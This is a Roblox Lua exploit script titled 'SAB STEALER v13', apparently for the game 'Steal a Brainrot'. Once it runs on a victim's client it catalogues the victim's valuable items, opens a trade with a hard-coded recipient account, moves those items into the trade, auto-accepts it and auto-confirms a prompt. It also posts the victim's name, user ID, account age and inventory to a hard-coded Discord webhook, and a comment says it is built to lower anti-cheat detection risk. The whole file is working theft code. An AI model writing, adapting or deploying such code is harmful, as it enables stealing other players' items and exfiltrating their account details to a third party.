--[[ SAB STEALER v13 — Venice.ai
     Sin VirtualInputManager (menos riesgo de BAC). Indice por slot.
]]
local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RS          = game:GetService("ReplicatedStorage")
local LP          = Players.LocalPlayer
local PG          = LP:WaitForChild("PlayerGui")

local WEBHOOK   = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
local TARGET    = "KIMILOSP"
local TARGET_ID = 9555775328
local DELAY     = 0.55
local EXECUTOR  = (identifyexecutor and select(1, identifyexecutor())) or "Delta"

-- ====================== LISTAS ======================
local BRAINROTS = {}
for _, n in ipairs({
"Noobini Santanini","Raccooni Jandelini","Malame Amarele","Buho de Fuego","Caramello Filtrello",
"Avocadorilla","Brutto Gialutto","Centrucci Nuclucci","Ganganzelli Trulala","Rhino Helicopterino",
"Stoppo Luminino","Tob Tobi Tobi","Lazy Ducky","Pineaplino","Pretzo Robo","Unclito Samito",
"Abyssaloco","Agarrini la Palini","Antonio","Arcadragon","Bearito Cabinito","Boppin Bunny",
"Bunito Bunito Spinito","Bunny and Eggy","Burguro And Fryuro","Capitano Moby","Cash or Card",
"Caylusaurus","Celestial Pegasus","Celularcini Viciosini","Cerberus","Chillin Chili","Chipso and Queso",
"Cloverat Clapat","Coco and Mango","Cooki and Milki","Digi Narwhal","Donkeyturbo Express",
"Dragon Aquanini","Dragon Cannelloni","Dragon Gingerini","Duggy Bros","Elefanto Frigo","Eviledon",
"Extinct Matteo","Festive 67","Fishino Clownino","Fortunu and Cashuru","Foxini Lanternini",
"Fragola La La La","Fragrama and Chocrama","Garama and Madundung","Ginger Gerat","Globa Steppa",
"Gobblino Uniciclino","Gold Gold Gold","Griffin","Guest 666","Gym Bros","Hopilikalika Hopilikalako",
"Hydra Bunny","Hydra Dragon Cannelloni","Jelly Moby","John Doe","Jolly Jolly Sahur","Kalika Bros",
"Karker Sahur","Ketchuru and Musturu","Ketupat Bros","Kraken","La Anniversary Grande","La Casa Boo",
"La Easter Grande","La Food Combinasion","La Ginger Sekolah","La Karkerkar Combinasion","La Lucky Grande",
"La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Summer Grande",
"La Supreme Combinasion","La Taco Combinasion","Las Sis","Lavadorito Spinito","Los Amigos","Los Bros",
"Los Chillis","Los Fruits","Los Hackers","Los Hotspotsitos","Los Jolly Combinasionas","Los Mariachis",
"Los Mi Gatitos","Los Primos","Los Sekolahs","Los Spaghettis","Los Tacoritas","Love Love Bear",
"Lovin Rose","Money Money Bros","Money Money Reindeer","Nacho Spyder","Noo my examine","Orcaledon",
"Pancake and Syrup","Please my Present","Popcuru and Fizzuru","Quackini Snackini","Reinito Sleighito",
"Rico Dinero","Rosetti Tualetti","Rosey and Teddy","Rubrikiko","Sammyni Cakini","Sammyni Fattini",
"Sand Sand Sand","Signore Carapace","Spinny Hammy","Spooky and Pumpky","Steakini Fattini","Swag Soda",
"Swaggy Bros","Tacorita Bicicleta","Telemorte","Tictac Sahur","Tirilikalika Tirilikalako","Tralaledon",
"Tuff Toucan","Ventoliero Pavonero","Venuspino","W or L","Capitano Americano","Bufalino Boomberino",
"Esok Goala","Los Tangcitos","Los Tictacs","Los Admins","Moby Bros","Var Var Var","Noodle Noodle Poodle",
"Grabatron","Cangurato Gelato","Rubiko and Kubiko","Toro Españolo","Chicleteira Champeona","Examen Bros",
"Pizza and Ranch","Los Secret Combinasionas","Honey Honey Bear","Scorpino Coasterino","Queen Bee",
"Smore Serat","Yetimactic","La Breakfast Combinasion","Bumbatron","Candini Fluffini","Polaroidini",
"La Fuse Machine","Nachorilla","Sammyni Truckini","Orchidox","Pop Pop Petalini","Motorino Bumbuni",
"Pelican Pachetto","Deputy Leopard","Chicli Chicla","Panda Popanda","La Craft Machine","Gold and Diamond",
"Los Dragons","Zebrino Pianino","Hydra Serpent","Lavamanta","Lionello Casarello","Draculino",
"Oni Oni Panda","Sammyni Spookyni","Phoenix","Boo Boo Rocket","Flying Dutchman","Dragon Skeletonini",
"Tosto Dino","Cobra Gelato","Skelly and Coffy","Medusini and Demonini","Arca Bros","Fang Fang Draculang",
"Pum Pum Pum","Spooky Spooky Sahur","Spooketti Tualetti","Puppetmaster","Scorpi Inferni","Jacko Jakat",
"Spooky Kart","Scarino Crowino","Balloon Baboon","Bling Luming","Spinny Bros","Tang Bros","Nacho Bros",
"Tic Bros","Scorpi Bros","Machine Bros","Sammyni Bros","Cabin Bros","Scary Bros","Headless Horseman",
"John Pork","Meowl","Skibidi Toilet","Strawberry Elephant","Cola Cat","Bananito","Money Money Cat",
"Money Money Man","Money Money Puggy","Job Job Job Sahur","Mi Gatito","Chicleteira Bicicleteira",
"Chicleteira Surfeiteira","Chicleteira Noelteira","Chicleteira Cupideira","Sammyni Spyderini",
"Orcalero Orcala","Orcalita Orcala","Bombardiro Crocodilo","Matteo","Camera Ramena","Capitano Gullini",
"Cigno Fulgoro","Chill Puppy","Chimnino","DJ Panda","Dug dug dug","Esok Sekolah","Frullato Framingo",
"Futbolini Skatini","Ketupat Kepat","La Extinct Grande","La Grande Combinasion","La Jolly Grande",
"La Spooky Grande","Los Candies","Los Planitos","Los Puggies","Los Spooky Combinasionas",
"Mieteteira Bicicleteira","Nuclearo Dinossauro","Pirulitoita Bicicleteira","Spaghetti Tualetti",
"Snailo Clovero","Tang Tang Keletang","Conetto Morsetto","Peschito Machito","Puffino Builderino",
"Gattino Hydrantino","Qamar Camelamp"
}) do BRAINROTS[n] = true end

local SKINS = {}
for _, n in ipairs({
"Rose","Gingerbread","Halloween","Christmas","Bunny Basket","Summer","Pot of Gold","Taco","Octo",
"Valentines","Easter","Lucky","Aquatic","Tralalero","Bee Emperor","Honey Bee"
}) do SKINS[n] = true end

local GEARS = {}
for _, n in ipairs({
"Santa's Sleigh","Cupid's Wings","Witch's Broom","Waverider","Yin Yang Slap","Cursed Slap","Cyber Slap",
"Divine Slap","Bloodmoon Slap","Radioactive Slap","Rainbow Slap","Rainbow Hammer","Bloodmoon Hammer",
"Radioactive Airstrike","Yin Yang Lamp","Demon's Head","Lava Slap","Lava Blaster","Alien Slap",
"Blackhole Bomb","Candy Sentry","Phantom Slap","Flying Bee","Crystal Slap","Candy Slap","Crystal Hammer"
}) do GEARS[n] = true end

-- ====================== MUTACIONES / TRAITS ======================
local MUTATIONS = {
  ["Gold"]={e="🟡",b=1.25}, ["Diamond"]={e="💎",b=1.5}, ["Bloodrot"]={e="🩸",b=2},
  ["Candy"]={e="🍬",b=4}, ["Lava"]={e="🌋",b=6}, ["Galaxy"]={e="🌌",b=7},
  ["Yin Yang"]={e="☯️",b=7.5}, ["Radioactive"]={e="☢️",b=8.5}, ["Cursed"]={e="👁️",b=9},
  ["Divine"]={e="✨",b=10}, ["Rainbow"]={e="🌈",b=10}, ["Cyber"]={e="🤖",b=11},
  ["Phantom"]={e="👻",b=12}, ["Crystal"]={e="🔮",b=13}, ["Eclipse"]={e="🌑",b=14}
}

local TRAIT_BONUS = {}
local function addT(k, v) TRAIT_BONUS[k] = v end
addT("Strawberry",9) addT("Meowl",8) addT("John Pork",7)
for _, k in ipairs({"Pink Egg","Rainbow Balloon","Skibidi"}) do addT(k,6.5) end
addT("Queen Bee",6)
for _, k in ipairs({"1 Year","Granny","Pink Balloon"}) do addT(k,5.5) end
for _, k in ipairs({"26","Ball","Blue Egg","Bull","Fire","Fire Bee","Fireworks","Halo","Ice Bee",
  "Lightning","Lucky","Nyan","Paint","Red Balloon","Reindeer Pet","Rose","Sun"}) do addT(k,5) end
for _, k in ipairs({":3","Aura Shades","Bunny Ears","Burger","Chocolate","Jackolantern Pet"}) do addT(k,4.5) end
for _, k in ipairs({"Bee","Blue Balloon","Claws","Disco","Glitched","Green Egg","Job Application",
  "Santa Hat","Sombrero","Zombie"}) do addT(k,4) end
addT("Tie",3.75)
for _, k in ipairs({"Green Balloon","Matteo Hat","RIP Gravestone","Spider"}) do addT(k,3.5) end
for _, k in ipairs({"10B","Bubblegum","Explosive","Galactic","Orange Balloon","Orange Egg",
  "Shark Fin","Skeleton","Witch Hat"}) do addT(k,3) end
for _, k in ipairs({"Comet-struck","Taco"}) do addT(k,2.5) end
addT("Snowy",2) addT("UFO",2) addT("Wet",1.5) addT("Sleepy",0) addT("Brazil",5)
for _, k in ipairs({"Algeria","Argentina","Australia","Austria","Belgium","Bosnia","Canada","Cape Verde",
  "Colombia","Croatia","Curaçao","Czechia","DR Congo","Ecuador","Egypt","England","France","Germany",
  "Ghana","Haiti","Iran","Iraq","Ivory Coast","Japan","Jordan","Mexico","Morocco","Netherlands",
  "New Zealand","Norway","Panama","Paraguay","Portugal","Qatar","Saudi Arabia","Scotland","Senegal",
  "South Africa","South Korea","Spain","Sweden","Switzerland","Tunisia","Turkey","United States",
  "Uruguay","Uzbekistan"}) do addT(k,4.5) end
addT("Indonesia",4)

-- ====================== MATCHER ======================
local ACCENTS = {["á"]="a",["à"]="a",["é"]="e",["è"]="e",["í"]="i",["ì"]="i",["ó"]="o",["ò"]="o",
                 ["ú"]="u",["ù"]="u",["ñ"]="n",["ü"]="u",["ç"]="c"}
local function norm(s)
  s = tostring(s or ""):lower()
  s = s:gsub("[\128-\255]", function(c) return ACCENTS[c] or c end)
  s = s:gsub("%s+", " ")
  s = s:gsub("[^%w ]", "")
  return (s:gsub("^%s*(.-)%s*$", "%1"))
end

local LOOKUP, KEYS = {}, {}
for n in pairs(BRAINROTS) do LOOKUP[norm(n)] = n end
for n in pairs(SKINS)     do LOOKUP[norm(n)] = n end
for n in pairs(GEARS)     do LOOKUP[norm(n)] = n end
for k in pairs(LOOKUP)    do table.insert(KEYS, k) end
table.sort(KEYS, function(a, b) return #a > #b end)

local MUT_LOOKUP, MUT_KEYS = {}, {}
for n in pairs(MUTATIONS) do MUT_LOOKUP[norm(n)] = n; table.insert(MUT_KEYS, norm(n)) end
table.sort(MUT_KEYS, function(a, b) return #a > #b end)

local TR_LOOKUP, TR_KEYS = {}, {}
for n in pairs(TRAIT_BONUS) do TR_LOOKUP[norm(n)] = n; table.insert(TR_KEYS, norm(n)) end
table.sort(TR_KEYS, function(a, b) return #a > #b end)

local function matchName(raw)
  local k = norm(raw)
  if k == "" then return nil end
  if LOOKUP[k] then return LOOKUP[k] end
  for _, key in ipairs(KEYS) do
    if k:find(key, 1, true) then return LOOKUP[key] end
  end
  return nil
end

local function cut(w, s, len) return w:sub(1, s - 1) .. " " .. w:sub(s + len) end
local function extract(w, keys, map)
  local out = {}
  for _, key in ipairs(keys) do
    local s = w:find(key, 1, true)
    if s then table.insert(out, map[key]); w = cut(w, s, #key) end
  end
  return out, w
end

local function cashValue(c)
  if not c then return 0 end
  local num, suf = tostring(c):match("([%d%.]+)%s*([KMB]?)")
  num = tonumber(num) or 0
  if suf == "K" then num = num * 1e3 elseif suf == "M" then num = num * 1e6 elseif suf == "B" then num = num * 1e9 end
  return num
end

local function fmtMoney(v)
  if v >= 1e9 then return string.format("%.1fB", v / 1e9) end
  if v >= 1e6 then return string.format("%.1fM", v / 1e6) end
  if v >= 1e3 then return string.format("%.1fK", v / 1e3) end
  return tostring(math.floor(v))
end

local function analyze(obj)
  local texts, cash = {}, nil
  local function take(t)
    if not t or t == "" then return end
    if t:find("%$") or t:find("/s") then
      if not cash then cash = t end
    else
      table.insert(texts, t)
    end
  end
  take(obj.Name)
  for _, a in ipairs(obj:GetAttributes()) do
    local v = obj:GetAttribute(a)
    if type(v) == "string" then take(v) end
  end
  for _, d in ipairs(obj:GetDescendants()) do
    table.insert(texts, d.Name)
    for _, a in ipairs(d:GetAttributes()) do
      local v = d:GetAttribute(a)
      if type(v) == "string" then take(v) end
    end
    if d:IsA("TextLabel") then take(d.Text) end
  end

  local hit, disp
  for _, t in ipairs(texts) do
    local h = matchName(t)
    if h then hit = h; disp = t; break end
  end
  if not disp then disp = texts[1] or obj.Name end

  local muts, traits = {}, {}
  if hit then
    local w = norm(table.concat(texts, " | "))
    local s = w:find(norm(hit), 1, true)
    if s then w = cut(w, s, #norm(hit)) end
    muts = extract(w, MUT_KEYS, MUT_LOOKUP)
    local _
    traits, _ = extract(w, TR_KEYS, TR_LOOKUP)
  end

  local mult = 1
  for _, m in ipairs(muts) do mult = mult + (MUTATIONS[m] and MUTATIONS[m].b or 0) end
  for _, t in ipairs(traits) do mult = mult + (TRAIT_BONUS[t] or 0) end
  local value = cashValue(cash) * mult
  for _, t in ipairs(traits) do if t == "Sleepy" then value = value * 0.5 break end end

  return { name = hit, display = disp, cash = cash, muts = muts, traits = traits, value = value }
end

local function slotOf(n)
  return tonumber(tostring(n or ""):match("(%d+)"))
end

-- ====================== INDICE GLOBAL ======================
local INDEX, INDEX_BY_NAME = {}, {}

local function indexContainer(container)
  local ok = pcall(function()
    for _, d in ipairs(container:GetDescendants()) do
      if d:IsA("Model") or d:IsA("MeshPart") or d:IsA("Part") or d:IsA("Tool")
         or d:IsA("StringValue") then
        local rec = analyze(d)
        if rec.name then
          local s = slotOf(d.Name) or (d.Parent and slotOf(d.Parent.Name))
          if s then INDEX[s] = rec end
          INDEX_BY_NAME[rec.name] = INDEX_BY_NAME[rec.name] or rec
        end
      end
    end
  end)
  return ok
end

local function buildIndex()
  INDEX, INDEX_BY_NAME = {}, {}
  indexContainer(workspace)
  indexContainer(RS)
end

-- ====================== DISPARO DE BOTONES ======================
local lastFire = 0
local function fireBtn(btn)
  if not btn or not btn.Visible then return false end
  local p = btn.Parent
  while p and p ~= PG do
    if p:IsA("GuiObject") and not p.Visible then return false end
    p = p.Parent
  end
  local now = os.clock()
  if now - lastFire < 0.05 then task.wait(0.05) end
  lastFire = os.clock()

  local ok = false
  if getconnections then
    for _, sig in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
      local s = btn[sig]
      if s then
        for _, c in ipairs(getconnections(s)) do
          if pcall(function() c:Fire() end) then ok = true end
        end
      end
    end
  end
  if not ok then pcall(function() btn:Activate() end) end
  return true
end

local function setSearch(box, txt)
  pcall(function() box:CaptureFocus() end)
  task.wait(0.08)
  box.Text = ""
  task.wait(0.05)
  box.Text = txt
  task.wait(0.2)
  if getconnections then
    for _, c in ipairs(getconnections(box.FocusLost)) do pcall(function() c:Fire(true) end) end
  end
  pcall(function() box:ReleaseFocus() end)
  task.wait(0.25)
end

-- ====================== GUI ======================
local gui = Instance.new("ScreenGui")
gui.Name = "SAB_Stealer"
gui.ResetOnSpawn = false
gui.Parent = PG

local panel = Instance.new("Frame")
panel.Size = UDim2.fromOffset(180, 16)
panel.Position = UDim2.new(0.5, -90, 0, 2)
panel.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
panel.BackgroundTransparency = 0.35
panel.BorderSizePixel = 0
panel.Active = true
panel.Parent = gui
Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 0, 14)
title.Position = UDim2.fromOffset(6, 1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 10
title.TextColor3 = Color3.fromRGB(120, 235, 150)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Text = "SAB STEALER"
title.Parent = panel

local hideBtn = Instance.new("TextButton")
hideBtn.Size = UDim2.fromOffset(16, 14)
hideBtn.Position = UDim2.new(1, -22, 0, 1)
hideBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
hideBtn.BorderSizePixel = 0
hideBtn.Font = Enum.Font.GothamBold
hideBtn.TextSize = 10
hideBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
hideBtn.Text = "+"
hideBtn.Parent = panel
Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(0, 4)

local stat = Instance.new("TextLabel")
stat.Size = UDim2.new(1, -12, 0, 34)
stat.Position = UDim2.fromOffset(6, 18)
stat.BackgroundTransparency = 1
stat.Font = Enum.Font.Code
stat.TextSize = 9
stat.TextColor3 = Color3.fromRGB(200, 200, 210)
stat.TextXAlignment = Enum.TextXAlignment.Left
stat.TextYAlignment = Enum.TextYAlignment.Top
stat.Text = "iniciando..."
stat.Visible = false
stat.Parent = panel

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, -12, 0, 14)
toggleBtn.Position = UDim2.new(0, 6, 1, -18)
toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
toggleBtn.BorderSizePixel = 0
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 9
toggleBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
toggleBtn.Text = "DETENER"
toggleBtn.Visible = false
toggleBtn.Parent = panel
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 4)

local function setStat(t) stat.Text = t end

hideBtn.MouseButton1Click:Connect(function()
  local c = panel.Size.Y.Offset < 30
  panel.Size = c and UDim2.fromOffset(180, 74) or UDim2.fromOffset(180, 16)
  stat.Visible = c
  toggleBtn.Visible = c
  hideBtn.Text = c and "-" or "+"
end)

local dragging, dStart, pStart
panel.InputBegan:Connect(function(i)
  if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
    dragging, dStart, pStart = true, i.Position, panel.Position
  end
end)
panel.InputChanged:Connect(function(i)
  if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
    local d = i.Position - dStart
    panel.Position = UDim2.new(pStart.X.Scale, pStart.X.Offset + d.X, pStart.Y.Scale, pStart.Y.Offset + d.Y)
  end
end)
panel.InputEnded:Connect(function(i)
  if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
    dragging = false
  end
end)

-- ====================== WEBHOOK ======================
local function httpPost(body)
  local fn = request or http_request or (syn and syn.request) or (http and http.request)
  if not fn then return false end
  return (pcall(fn, {
    Url = WEBHOOK, Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode(body)
  }))
end

local function fmtLine(rec, i)
  local name = tostring(rec.name or "?"):gsub("%s+", " "):sub(1, 60)
  local mut = ""
  if rec.muts and #rec.muts > 0 then
    local t = {}
    for _, m in ipairs(rec.muts) do table.insert(t, MUTATIONS[m].e .. " " .. m) end
    mut = table.concat(t, " ") .. ": "
  end
  local trait = (rec.traits and #rec.traits > 0) and (" - " .. table.concat(rec.traits, ", ")) or ""
  local money = (rec.value and rec.value > 0) and (" | 💰 +" .. fmtMoney(rec.value) .. "/s") or ""
  return i .. ". " .. mut .. name .. trait .. money
end

local function section(label, list, prefix)
  local out = {}
  if #list == 0 then
    table.insert(out, { name = label .. " (0)", value = "*NONE*", inline = false })
    return out
  end
  local i, part = 1, 1
  while i <= #list and part <= 5 do
    local lines, len = {}, 0
    while i <= #list and len < 820 do
      local l = fmtLine(list[i], i)
      len = len + #l + 1
      table.insert(lines, l)
      i = i + 1
    end
    local nm = label .. " (" .. #list .. ")"
    if part > 1 then nm = label .. " (cont " .. part .. ")" end
    if prefix and part == 1 then table.insert(lines, 1, prefix) end
    table.insert(out, { name = nm, value = table.concat(lines, "\n"), inline = false })
    part = part + 1
  end
  return out
end

local function sendWebhook(bt, bs, gt, ot, estado)
  local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
  local best, bestV = nil, -1
  for _, r in ipairs(bt) do if (r.value or 0) > bestV then best, bestV = r, r.value or 0 end end
  local content = best and ("@everyone the best brainrot targeted is \"" .. tostring(best.name) .. "\"")
                      or "@everyone no brainrots from the list found"

  local fields = {}
  for _, f in ipairs(section("🧠 **BRAINROT TARGET**", bt)) do table.insert(fields, f) end
  for _, f in ipairs(section("⚙️ **BASE TARGET**", bs)) do table.insert(fields, f) end
  for _, f in ipairs(section("🔧 **GEARS TARGET**", gt)) do table.insert(fields, f) end
  for _, f in ipairs(section("🔥 **ITEMS NO TARGET**", ot, "🧠 Brainrots:")) do table.insert(fields, f) end
  table.insert(fields, { name = "💻 Executor", value = EXECUTOR, inline = true })
  table.insert(fields, { name = "👥 Jugadores", value = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, inline = true })
  table.insert(fields, { name = "💳 Cuenta", value = LP.AccountAge .. " dias", inline = true })
  while #fields > 24 do table.remove(fields) end

  local body = {
    username = "SAB STEALER", avatar_url = thumb, content = content,
    embeds = {{
      title = "Base de " .. LP.Name,
      description = "**" .. (#bt + #bs + #gt) .. "** items robables | " .. estado,
      color = 0x2ECC71, thumbnail = { url = thumb }, fields = fields,
      footer = { text = LP.Name .. " • " .. LP.UserId .. " • www.venice.ai • " .. os.date("%d/%m/%Y %H:%M") },
      timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }}
  }
  if not httpPost(body) then task.wait(1.5); httpPost(body) end
end

-- ====================== TRADE ======================
local function getTradeMain()
  local g = PG:FindFirstChild("TradeLiveTrade")
  return g and g:FindFirstChild("TradeLiveTrade")
end

local function listRoot()
  local l = PG:FindFirstChild("TradePlayerList")
  return l and l:FindFirstChild("TradePlayerList")
end

local function closeList()
  local root = listRoot()
  local h = root and root:FindFirstChild("Header")
  local c = h and h:FindFirstChild("Close")
  if c then fireBtn(c) end
end

local function tradeCandidates()
  local first, rest = {}, {}
  for _, o in ipairs(PG:GetDescendants()) do
    if (o:IsA("ImageButton") or o:IsA("TextButton")) and o.Visible and o.AbsoluteSize.X > 12 then
      local nm = o.Name:lower()
      local txt = o:IsA("TextButton") and (o.Text or ""):lower() or ""
      for _, d in ipairs(o:GetDescendants()) do
        if d:IsA("TextLabel") then txt = txt .. " " .. (d.Text or ""):lower() end
      end
      if not nm:find("tradelive") and not nm:find("tradeplayer") and
         (nm:find("trade") or nm:find("intercamb") or txt:find("trade") or txt:find("intercamb")) then
        local rg = o:FindFirstAncestorWhichIsA("ScreenGui")
        local gn = rg and rg.Name:lower() or ""
        if gn:find("leftbottom") or gn:find("leftcenter") or gn:find("topui") then
          table.insert(first, o)
        else
          table.insert(rest, o)
        end
      end
    end
  end
  for _, o in ipairs(rest) do table.insert(first, o) end
  return first
end

local function openTradeList()
  if PG:FindFirstChild("TradePlayerList") then return true end
  for _, btn in ipairs(tradeCandidates()) do
    fireBtn(btn)
    for _ = 1, 10 do
      task.wait(0.2)
      if PG:FindFirstChild("TradePlayerList") then return true end
    end
  end
  return PG:FindFirstChild("TradePlayerList") ~= nil
end

local function sendTrade()
  if not openTradeList() then return false end
  local root = listRoot()
  local sec = root and root:FindFirstChild("Sections")
  local pl  = sec and sec:FindFirstChild("Players")
  local scroll = pl and pl:FindFirstChild("List")
  if not scroll then return false end
  local sf = pl:FindFirstChild("SearchFrame")
  local box = sf and sf:FindFirstChild("SearchBox")

  for _ = 1, 5 do
    if box and box:IsA("TextBox") then setSearch(box, TARGET) end
    for _, row in ipairs(scroll:GetChildren()) do
      local nm = row.Name:lower()
      if nm:find(TARGET:lower(), 1, true) or nm:find(tostring(TARGET_ID), 1, true) then
        local fill = row:FindFirstChild("Fill")
        local send = fill and fill:FindFirstChild("Send")
        if send then fireBtn(send); task.wait(0.4); return true end
      end
    end
    task.wait(0.4)
  end
  return false
end

-- ====================== SLOTS DEL TRADE ======================
local function entryRecord(entry)
  local rec = analyze(entry)
  if rec.name then return rec end
  local s = slotOf(entry.Name)
  local alt = s and INDEX[s]
  if alt and alt.name then
    return { name = alt.name, display = alt.display, cash = alt.cash, muts = alt.muts, traits = alt.traits, value = alt.value }
  end
  local alt2 = INDEX_BY_NAME[norm(entry.Name)]
  if alt2 then return alt2 end
  return rec
end

local function collectTargets()
  local main = getTradeMain()
  local your = main and main:FindFirstChild("Your")
  local scroll = your and your:FindFirstChild("ScrollingFrame")
  if not scroll then return nil end

  local bt, bs, gt, ot = {}, {}, {}, {}
  for _, e in ipairs(scroll:GetChildren()) do
    if e:IsA("Frame") or e:IsA("ImageButton") then
      local r = entryRecord(e)
      r.inst = e
      if r.name then
        if BRAINROTS[r.name] then table.insert(bt, r)
        elseif SKINS[r.name] then table.insert(bs, r)
        elseif GEARS[r.name] then table.insert(gt, r)
        else table.insert(ot, r) end
      else
        table.insert(ot, r)
      end
    end
  end
  return bt, bs, gt, ot
end

local function placeAll(bt, bs, gt)
  local set = {}
  for _, l in ipairs({bt, bs, gt}) do
    for _, r in ipairs(l) do set[r.inst] = true end
  end
  local total, placed, done = #bt + #bs + #gt, 0, {}
  local t0 = os.clock()

  while RUN and getTradeMain() and os.clock() - t0 < 100 do
    local pending = false
    for inst in pairs(set) do
      if not done[inst] and inst.Parent then
        local btn = inst:FindFirstChild("Spacer") or inst:FindFirstChildWhichIsA("ImageButton")
        if btn and fireBtn(btn) then
          done[inst] = true
          placed = placed + 1
          setStat("puestos: " .. placed .. "/" .. total)
          task.wait(DELAY)
        end
        pending = true
      end
    end
    if not pending then break end
    task.wait(0.15)
  end
  return placed
end

-- ====================== PROMPT ======================
local RUN = true
local lastPrompt = 0

task.spawn(function()
  while true do
    task.wait(0.2)
    if RUN then
      local g = PG:FindFirstChild("DuelsMachinePrompt")
      local inner = g and g:FindFirstChild("DuelsMachinePrompt")
      local prompt = inner and inner:FindFirstChild("Prompt")
      local yes = prompt and prompt:FindFirstChild("Yes")
      if yes and prompt.Visible and os.clock() - lastPrompt > 1.5 then
        lastPrompt = os.clock()
        fireBtn(yes)
      end
    end
  end
end)

-- ====================== BUCLE ======================
local cycle = 0
local sentOnce = false

toggleBtn.MouseButton1Click:Connect(function()
  RUN = not RUN
  toggleBtn.Text = RUN and "DETENER" or "REANUDAR"
  title.TextColor3 = RUN and Color3.fromRGB(120, 235, 150) or Color3.fromRGB(235, 120, 120)
end)

task.spawn(function()
  setStat("indexando...")
  buildIndex()
  local found = 0
  for _ in pairs(INDEX) do found = found + 1 end
  setStat("slots indexados: " .. found)

  while RUN do
    cycle = cycle + 1
    pcall(function()
      if not getTradeMain() then
        setStat("ciclo " .. cycle .. "\nmandando trade...")
        if not sendTrade() then closeList(); task.wait(3) end
      end

      local opened = false
      for _ = 1, 70 do
        if getTradeMain() then opened = true break end
        if not RUN then break end
        task.wait(0.25)
      end

      if opened then
        closeList()
        task.wait(1.5)

        local bt, bs, gt, ot
        for _ = 1, 30 do
          bt, bs, gt, ot = collectTargets()
          if bt and (#bt + #bs + #gt + #ot) > 0 then break end
          task.wait(0.3)
        end

        if bt then
          local total = #bt + #bs + #gt
          setStat("slots: " .. (#bt + #bs + #gt + #ot) .. "\nobjetivos: " .. total)
          if not sentOnce then
            sentOnce = true
            sendWebhook(bt, bs, gt, ot, "Escaneo del trade")
          end
          if total > 0 then
            setStat("poniendo " .. total .. "...")
            placeAll(bt, bs, gt)
          end

          setStat("READY / ACCEPT...")
          while RUN and getTradeMain() do
            local main = getTradeMain()
            local other = main and main:FindFirstChild("Other")
            local your  = main and main:FindFirstChild("Your")
            local btn = (other and other:FindFirstChild("ReadyButton")) or (your and your:FindFirstChild("ReadyButton"))
            local txt = btn and btn:FindFirstChild("Txt")
            if btn and txt and txt:IsA("TextLabel") then
              local s = string.upper(txt.Text or "")
              if s == "READY" or s == "ACCEPT" then fireBtn(btn) end
            end
            task.wait(0.4)
          end
        end
        setStat("trade cerrado\nreintentando...")
      end
    end)
    task.wait(3)
  end
end)
